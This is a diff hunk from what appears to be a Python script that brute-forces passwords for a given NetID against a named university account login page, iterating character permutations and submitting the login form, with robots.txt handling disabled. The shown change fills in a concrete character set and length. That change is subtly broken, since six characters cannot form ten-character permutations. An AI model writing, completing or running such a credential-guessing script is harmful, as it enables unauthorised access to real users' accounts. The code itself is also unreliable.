@@ -13,7 +13,7 @@ br.set_handle_robots(False)
 user=raw_input("Enter the NetID:- ")
 count=0
 
-combos = itertools.permutations("SOME_CHARACTER_SET",SIZE_OF_PASSWORD) 
+combos = itertools.permutations("bkbkbk",10)
 br.open("http://myaccount.snu.edu.in/login.php")
 for x in combos:	
 	br.select_form(nr=0)
